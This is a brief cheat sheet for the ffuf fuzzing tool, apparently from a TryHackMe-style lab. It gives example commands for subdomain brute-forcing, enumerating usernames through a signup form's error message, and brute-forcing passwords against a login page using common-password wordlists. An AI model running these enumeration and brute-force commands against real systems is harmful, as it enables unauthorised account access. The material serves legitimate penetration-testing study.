Link: https://www.freecodecamp.org/news/how-to-fuzz-hidden-directories-files-with-ffuf/

**Operators:**

```
Wordlist: -w [path to wordlist] 
Host: -H "Host: FUZZ.domain.com" ("FUZZ" is where wordlist will be inserted) 
URL: -u [http://domain/](http://domain/ "http://domain/") OR [http://1.1.1.1/](http://1.1.1.1/ "http://1.1.1.1/")
```


**Setup:**

```
ffuf -w [path to wordlist] -H [Host] -u [IP or URL]
```


**Target Area Specific Examples:**

- DNS Bruteforcing

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u [http://10.10.95.216/](http://10.10.95.216/ "http://10.10.95.216/")
```


- Username Searching

```
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u [http://10.10.160.36/customers/signup](http://10.10.160.36/customers/signup "http://10.10.160.36/customers/signup") -mr "username already exists"
```


- Username/Password Matching

```
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u [http://10.10.160.36/customers/login](http://10.10.160.36/customers/login "http://10.10.160.36/customers/login") -fc 200
```
